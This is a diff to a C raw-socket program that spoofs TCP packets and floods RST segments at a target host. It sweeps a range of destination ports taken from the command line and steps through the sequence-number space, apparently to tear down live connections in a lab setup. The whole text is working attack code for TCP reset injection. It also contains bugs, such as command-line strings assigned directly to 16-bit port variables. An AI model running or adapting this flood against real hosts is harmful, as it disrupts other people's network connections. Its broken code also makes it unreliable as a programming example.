@@ -56,22 +56,27 @@ struct pshdr {
 
 int main(int argc, char *argv[])
 {
-    int sockfd, n, yes = 1;
+    int sockfd, total, n, yes = 1;
     char datagram[DATAGRAMSIZE], pseudo_packet[PSEUDOPACKETSIZE], ipstr[INET_ADDRSTRLEN];
     struct iphdr *iph;
     struct tcphdr *tcph, *cstcph;
     struct pshdr *psh;
-    char *srcIP = "10.0.2.2";
-    char *dstIP = "10.0.2.15";
-    uint16_t srcPort = 35801;
-    uint16_t dstPort = 1025;
-    uint32_t seq0 = 0;
-    uint32_t ack0 = 0;
+    char *sIP = "10.0.2.2";
+    char *dIP = "10.0.2.15";
+    uint16_t sport = 35801, dport, port0 = 30000, port_max = UINT_MAX - 1, win = 8192;
     uint16_t id0 = rand() %(65536);
-    uint16_t win = 8192;
+    uint32_t seq, seq0 = 0, ack0 = 0;
     size_t tcp_len;
     void *data;
     struct sockaddr_in sa;
+
+    if (argc != 3) {
+	    fprintf(stderr,"usage: reset port0 port_max\n");
+	    exit(1);
+	}
+
+    port0 = argv[1];
+    port_max = argv[2];
 
     // Open raw socket without protocol header
     if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
@@ -104,14 +109,14 @@ int main(int argc, char *argv[])
     iph -> ttl = 64; // time to live
     iph -> protocol = IPPROTO_TCP; // TCP
     iph -> check = 0;
-    inet_pton(AF_INET, srcIP, &(iph -> saddr));
-    inet_pton(AF_INET, dstIP, &(iph -> daddr));
+    inet_pton(AF_INET, sIP, &(iph -> saddr));
+    inet_pton(AF_INET, dIP, &(iph -> daddr));
 
     // calculate IP check sum
     iph -> check = ip_checksum((void *) datagram, sizeof(struct iphdr) + tcp_len);
     
     // pack TCP header
-    tcph -> source = htons(srcPort); // source port
+    tcph -> source = htons(sport); // source port
     tcph -> dest = 0; // destination port init to 0
     tcph -> seq = 0; // sequence number initially set to 0
     tcph -> ack_seq = 0; // ack sequence number
@@ -135,39 +140,37 @@ int main(int argc, char *argv[])
     memcpy(cstcph, (char *)tcph, tcp_len);
 
     // pack pseudo header
-    inet_pton(AF_INET, srcIP, &(psh -> src_addr)); // 32 bit source address
-    inet_pton(AF_INET, dstIP, &(psh -> dst_addr)); // 32 bit destination address
+    inet_pton(AF_INET, sIP, &(psh -> src_addr)); // 32 bit source address
+    inet_pton(AF_INET, dIP, &(psh -> dst_addr)); // 32 bit destination address
     psh -> reserved = 0;
     psh -> protocol = IPPROTO_TCP; // TCP
     psh -> tcp_len = htons(tcp_len); // TCP segment length
 
-    // flood RST
-    while(1)
-    {
-        tcph -> dest = htons(dstPort);
-        cstcph -> dest = htons(dstPort);
-        tcph -> seq = htonl(seq0); // set seq number
-        cstcph -> seq = htonl(seq0); // set seq number in the checksum header
-        // tcph -> ack_seq = htonl(ack0++); // set ack seq number
-        // cstcph -> ack_seq = htonl(ack0); // set ack seq number in the checksum header
-        tcph -> check = 0; // reset check sum
-        cstcph -> check = 0; // reset check sum  
-        tcph -> check = ip_checksum(pseudo_packet, sizeof(struct pshdr) + tcp_len); // calculate check sum
+    // build sockaddr
+    sa.sin_family = AF_INET;
+    // sa.sin_port = htons(dport);
+    inet_pton(AF_INET, dIP, &(sa.sin_addr.s_addr));
 
-        // build sockaddr
-        sa.sin_family = AF_INET;
-        sa.sin_port = htons(dstPort);
-        inet_pton(AF_INET, dstIP, &(sa.sin_addr.s_addr));
+    // RST flood loop
+    for (dport = port0; dport <= port_max; dport++) {
+        for (seq = seq0 ; seq < UINT_MAX - win; seq += win) {
+            tcph -> dest = htons(dport);
+            cstcph -> dest = htons(dport);
+            tcph -> seq = htonl(seq); // set seq number
+            cstcph -> seq = htonl(seq); // set seq number in the checksum header
+            // tcph -> ack_seq = htonl(ack0++); // set ack seq number
+            // cstcph -> ack_seq = htonl(ack0); // set ack seq number in the checksum header
+            tcph -> check = 0; // reset check sum
+            cstcph -> check = 0; // reset check sum  
+            tcph -> check = ip_checksum(pseudo_packet, sizeof(struct pshdr) + tcp_len); // calculate check sum
 
-        if ((n = sendto(sockfd, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
-        {
-            perror("fakesync: sendto()\n");
+            if ((n = sendto(sockfd, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
+            {
+                perror("fakesync: sendto()\n");
+            }
         }
-        // break;
-
-        seq0 += win; // increment sequence by window size
-        dstPort = htons(rand() %(65535+1-1024)+1024); // pick another random destination port
     }
+// dport = htons(rand() %(65535+1-1024)+1024); // pick another random destination port
 
     return 0;
 }
